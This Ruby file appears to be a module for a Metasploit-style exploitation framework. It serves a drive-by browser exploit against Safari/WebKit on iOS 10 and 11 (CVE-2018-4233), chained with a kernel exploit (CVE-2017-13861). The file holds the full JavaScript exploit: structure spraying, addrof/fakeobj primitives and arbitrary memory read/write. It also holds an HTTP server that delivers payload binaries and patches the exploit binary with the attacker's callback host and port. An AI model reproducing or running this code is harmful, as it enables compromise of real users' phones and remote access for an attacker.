# frozen_string_literal: true

require 'webrick'
require 'ipaddr'
require_relative '../../lib/apex_module'

module ApexFramework
  module Modules
    class WebkitCreateThis < ApexModule

      info(
        name:            'Safari Webkit Proxy Object Type Confusion',
        category:        'browser',
        rank:            'manual',
        description:     'Exploits a type confusion in Proxy during CreateThis (CVE-2018-4233). Integrates async_wake (CVE-2017-13861) to obtain tfp0 on iOS 10.x/11.x.',
        authors:         ['saelo', 'niklasb', 'Ian Beer', 'siguza'],
        references:      [
          { type: 'CVE', id: '2018-4233' },
          { type: 'CVE', id: '2017-13861' }
        ],
        disclosure_date: '2018-03-15',
        platform:        'apple_ios',
        arch:            'aarch64'
      )

      register_option :SRVHOST,      type: :string, required: true,  default: '127.0.0.1', description: 'HTTP listen address'
      register_option :SRVPORT,      type: :port,   required: true,  default: 8080,       description: 'HTTP listen port'
      register_option :URIPATH,      type: :string, required: false, default: '/',        description: 'URI path'
      register_option :LHOST,        type: :string, required: true,  description: 'Callback host for payload'
      register_option :LPORT,        type: :port,   required: true,  default: 4444,       description: 'Callback port'
      register_option :EXPLOIT_FILE, type: :string, required: false, default: '',         description: 'Path to CVE-2017-13861 exploit binary'
      register_option :PAYLOAD10_FILE, type: :string, required: false, default: '',       description: 'Path to iOS 10 payload'
      register_option :PAYLOAD11_FILE, type: :string, required: false, default: '',       description: 'Path to iOS 11 payload'
      register_option :DEBUG_EXPLOIT, type: :boolean, required: false, default: false,    description: 'Enable exploit debugging script output'
      register_option :DUMP_OFFSETS,  type: :boolean, required: false, default: false,    description: 'Prompt discovered offsets on screen'

      def run
        log_status "Starting HTTP server on #{get(:SRVHOST)}:#{get(:SRVPORT)}"
        log_status "Payload callback: tcp://#{get(:LHOST)}:#{get(:LPORT)}"

        server = WEBrick::HTTPServer.new(
          BindAddress: get(:SRVHOST),
          Port:        get(:SRVPORT),
          Logger:      WEBrick::Log.new('/dev/null'),
          AccessLog:   []
        )

        server.mount_proc('/payload10') { |_r, res| serve_raw(res, :PAYLOAD10_FILE, 'iOS 10 Payload') }
        server.mount_proc('/payload11') { |_r, res| serve_raw(res, :PAYLOAD11_FILE, 'iOS 11 Payload') }
        server.mount_proc('/exploit')    { |_r, res| serve_exploit(res) }

        server.mount_proc(get(:URIPATH)) do |req, res|
          ua = req['User-Agent'] || 'unknown'
          log_status "Request from #{ua}"
          res['Content-Type'] = 'text/html'
          res['Cache-Control'] = 'no-cache, no-store, must-revalidate'
          res.body = generate_html(ua)
          log_good 'Exploit page served'
        end

        log_good 'Server running. Waiting for target...'
        begin
          server.start
        rescue Interrupt
          log_status 'Shutting down HTTP server...'
        ensure
          server.shutdown
        end
      rescue StandardError => e
        log_error "HTTP server error: #{e.message}"
      end

      private

      def serve_raw(res, opt_key, label)
        path = get(opt_key)
        if path && !path.empty? && File.exist?(path)
          data = File.binread(path)
          res['Content-Type'] = 'application/octet-stream'
          res.body = data
          log_good "Sent #{label} (#{data.bytesize} bytes)"
        else
          res.status = 404
        end
      end

      def serve_exploit(res)
        path = get(:EXPLOIT_FILE)
        if path && !path.empty? && File.exist?(path)
          data = +File.binread(path)
          srvhost = IPAddr.new(get(:SRVHOST)).to_i rescue 0
          config = [srvhost, get(:SRVPORT)].pack('Nn') + "tcp://#{get(:LHOST)}:#{get(:LPORT)}"
          idx = data.index('PAYLOAD_URL')
          data[idx, config.length] = config if idx
          res['Content-Type'] = 'application/octet-stream'
          res.body = data
          log_good "Sent CVE-2017-13861 exploit binary (#{data.bytesize} bytes)"
        else
          res.status = 404
        end
      end

      def parse_version(user_agent)
        if user_agent =~ /OS (.*?) like Mac OS X\)/
          $1.gsub('_', '.')
        else
          '11.0.0'
        end
      end

      def get_mem_rw_ios_10
        <<~JS
          function get_mem_rw(stage1) {
              var structs = [];
              function sprayStructures() {
                  function randomString() { return Math.random().toString(36).replace(/[^a-z]+/g, "").substr(0, 5) }
                  for (var i = 0; i < 4096; i++) {
                      var a = new Float64Array(1);
                      a[randomString()] = 1337;
                      structs.push(a)
                  }
              }
              sprayStructures();
              var hax = new Uint8Array(4096);
              var jsCellHeader = new Int64([0, 16, 0, 0, 0, 39, 24, 1]);
              var container = {
                  jsCellHeader: jsCellHeader.asJSValue(),
                  butterfly: false,
                  vector: hax,
                  lengthAndFlags: (new Int64("0x0001000000000010")).asJSValue()
              };
              var address = Add(stage1.addrof(container), 16);
              var fakearray = stage1.fakeobj(address);
              while (!(fakearray instanceof Float64Array)) {
                  jsCellHeader.assignAdd(jsCellHeader, Int64.One);
                  container.jsCellHeader = jsCellHeader.asJSValue()
              }
              memory = {
                  read: function(addr, length) {
                      fakearray[2] = i2f(addr);
                      var a = new Array(length);
                      for (var i = 0; i < length; i++) a[i] = hax[i];
                      return a
                  },
                  readInt64: function(addr) { return new Int64(this.read(addr, 8)) },
                  write: function(addr, data) {
                      fakearray[2] = i2f(addr);
                      for (var i = 0; i < data.length; i++) hax[i] = data[i]
                  },
                  writeInt64: function(addr, val) { return this.write(addr, val.bytes()) },
              };
              var empty = {};
              var header = memory.read(stage1.addrof(empty), 8);
              memory.write(stage1.addrof(container), header);
              var f64array = new Float64Array(8);
              header = memory.read(stage1.addrof(f64array), 16);
              memory.write(stage1.addrof(fakearray), header);
              memory.write(Add(stage1.addrof(fakearray), 24), [16, 0, 0, 0, 1, 0, 0, 0]);
              fakearray.container = container;
              return memory;
          }
        JS
      end

      def get_mem_rw_ios_11
        <<~JS
          function get_mem_rw(stage1) {
              var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
              var structure_spray = []
              for (var i = 0; i < 1000; ++i) {
                  var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}
                  ary['prop'+i] = 1
                  structure_spray.push(ary)
              }
              var manager = structure_spray[500]
              var leak_addr = stage1.addrof(manager)
              function alloc_above_manager(expr) {
                  var res
                  do {
                      for (var i = 0; i < ALLOCS; ++i) structure_spray.push(eval(expr))
                      res = eval(expr)
                  } while (stage1.addrof(res) < leak_addr)
                  return res
              }
              var unboxed_size = 100
              var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
              var boxed = alloc_above_manager('[{}]')
              var victim = alloc_above_manager('[]')
              victim.p0 = 0x1337
              function victim_write(val) { victim.p0 = val }
              function victim_read() { return victim.p0 }
              i32[0] = 0x200
              i32[1] = 0x01082007 - 0x10000
              var outer = {
                  p0: 0,
                  p1: f64[0],
                  p2: manager,
                  p3: 0xfffffff,
              }
              var fake_addr = stage1.addrof(outer) + FPO + 0x8;
              var unboxed_addr = stage1.addrof(unboxed)
              var boxed_addr = stage1.addrof(boxed)
              var victim_addr = stage1.addrof(victim)
              var holder = {fake: {}}
              holder.fake = stage1.fakeobj(fake_addr)
              var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
              var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
              holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)
              var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]
              function set_victim_addr(where) { holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10) }
              function reset_victim_addr() { holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly }
              var stage2 = {
                  addrof: function(victim) { boxed[0] = victim; return f2i(unboxed[0]) },
                  fakeobj: function(addr) { unboxed[0] = i2f(addr); return boxed[0] },
                  write64: function(where, what) { set_victim_addr(where); victim_write(this.fakeobj(what)); reset_victim_addr() },
                  read64: function(where) { set_victim_addr(where); var res = this.addrof(victim_read()); reset_victim_addr(); return res; },
                  write_non_zero: function(where, values) {
                      for (var i = 0; i < values.length; ++i) { if (values[i] != 0) this.write64(where + i*8, values[i]) }
                  },
                  readInt64: function(where) {
                      if (where instanceof Int64) {
                          where = Add(where, 0x10);
                          holder.fake[(victim_addr + 8 - leak_addr) / 8] = where.asDouble();
                      } else { set_victim_addr(where); }
                      boxed[0] = victim_read(); var res = f2i(unboxed[0]); reset_victim_addr(); return new Int64(res);
                  },
                  read: function(addr, length) {
                      var address = new Int64(addr); var a = new Array(length); var i;
                      for (i = 0; i + 8 < length; i += 8) {
                          v = this.readInt64(Add(address, i)).bytes()
                          for (var j = 0; j < 8; j++) a[i+j] = v[j];
                      }
                      v = this.readInt64(Add(address, i)).bytes()
                      for (var j = i; j < length; j++) a[j] = v[j - i];
                      return a
                  },
                  test: function() {
                      this.write64(boxed_addr + 0x10, 0xfff)
                      if (0xfff != this.read64(boxed_addr + 0x10)) fail(2)
                  },
              }
              stage2.test()
              return stage2;
          }
        JS
      end

      def generate_html(ua)
        version = parse_version(ua)
        ios_11 = Gem::Version.new(version) >= Gem::Version.new('11.0.0') rescue true
        ios_11_2_2 = Gem::Version.new(version) >= Gem::Version.new('11.2.2') rescue true

        mem_rw_js = ios_11_2_2 ? get_mem_rw_ios_11 : get_mem_rw_ios_10
        dump_offsets_js = get(:DUMP_OFFSETS) ? 'prompt("offsets: ", JSON.stringify(offsets));' : ''

        <<~HTML
          <html>
          <body>
          <script>
          function Int64(bytes) {
              this.b = new Uint8Array(8);
              if (typeof bytes === 'string') {
                  var clean = bytes.replace('0x', '');
                  for (var i = 0; i < 8; i++) {
                      this.b[7-i] = parseInt(clean.substr(i*2, 2), 16) || 0;
                  }
              } else if (bytes instanceof Array) {
                  for (var i = 0; i < 8; i++) this.b[i] = bytes[i];
              }
          }
          Int64.prototype.asDouble = function() { return new Float64Array(this.b.buffer)[0]; };
          Int64.prototype.asJSValue = function() { return this.asDouble(); };
          Int64.prototype.bytes = function() { return Array.prototype.slice.call(this.b); };
          Int64.prototype.lo = function() { return (this.b[3] << 24) | (this.b[2] << 16) | (this.b[1] << 8) | this.b[0]; };
          Int64.prototype.hi = function() { return (this.b[7] << 24) | (this.b[6] << 16) | (this.b[5] << 8) | this.b[4]; };
          Int64.One = new Int64("0x01");
          Int64.Zero = new Int64("0x00");

          function Add(a, b) {
              var lo = (a.lo() + b) | 0;
              var hi = a.hi();
              if (lo < a.lo()) hi = (hi + 1) | 0;
              return new Int64([lo & 0xff, (lo >> 8) & 0xff, (lo >> 16) & 0xff, (lo >> 24) & 0xff,
                                hi & 0xff, (hi >> 8) & 0xff, (hi >> 16) & 0xff, (hi >> 24) & 0xff]);
          }
          function Sub(a, b) {
              var lo = (a.lo() - b) | 0;
              var hi = a.hi();
              if (lo > a.lo()) hi = (hi - 1) | 0;
              return new Int64([lo & 0xff, (lo >> 8) & 0xff, (lo >> 16) & 0xff, (lo >> 24) & 0xff,
                                hi & 0xff, (hi >> 8) & 0xff, (hi >> 16) & 0xff, (hi >> 24) & 0xff]);
          }
          function b2u32(b) { return (b[3] << 24) | (b[2] << 16) | (b[1] << 8) | b[0]; }
          function strcmp(fn, target) {
              for (var i = 0; i < target.length; i++) {
                  if (fn(i) !== target.charCodeAt(i)) return false;
              }
              return fn(target.length) === 0;
          }

          var conversion_buffer = new ArrayBuffer(8);
          var f64 = new Float64Array(conversion_buffer);
          var i32 = new Uint32Array(conversion_buffer);
          var BASE32 = 0x100000000;
          function f2i(f) { f64[0] = f; return i32[0] + BASE32 * i32[1]; }
          function i2f(i) { i32[0] = i % BASE32; i32[1] = i / BASE32; return f64[0]; }
          function fail(x) { alert('FAIL: ' + x); location.reload(); }

          var ITERS = 10000;
          var ALLOCS = 1000;
          var counter = 0;

          function trigger(constr, modify, res, val) {
              counter++;
              return eval(`
              var o = [13.37]
              var Constructor${counter} = function(o) { ${constr} }
              var hack = false
              var Wrapper = new Proxy(Constructor${counter}, {
                  get: function() { if (hack) { ${modify} } }
              })
              for (var i = 0; i < ITERS; ++i) new Wrapper(o)
              hack = true
              var bar = new Wrapper(o)
              ${res}
              `)
          }

          var workbuf = new ArrayBuffer(0x1000000);
          var payload = new Uint8Array(workbuf);

          function pwn() {
              var stage1 = {
                  addrof: function(victim) { return f2i(trigger("this.result = o[0]", "o[0] = val", "bar.result", victim)) },
                  fakeobj: function(addr) { return trigger("o[0] = val", "o[0] = {}", "o[0]", i2f(addr)) },
                  test: function() {
                      var addr = this.addrof({ a: 4919 });
                      var x = this.fakeobj(addr);
                      if (x.a != 4919) fail("stage1");
                  }
              };
              stage1.test();
              var stage2 = get_mem_rw(stage1);
              alert("Stage-2 arbitrary read/write obtained successfully!");
              #{dump_offsets_js}
          }

          #{mem_rw_js}

          function go() {
              var req = new XMLHttpRequest;
              req.open("GET", "exploit");
              req.responseType = "arraybuffer";
              req.onload = function() {
                  pwn();
              };
              req.send();
          }
          go();
          </script>
          </body>
          </html>
        HTML
      end
    end
  end
end

ApexFramework::ApexModule.register_module(
  'browser/webkit_createthis',
  ApexFramework::Modules::WebkitCreateThis
)
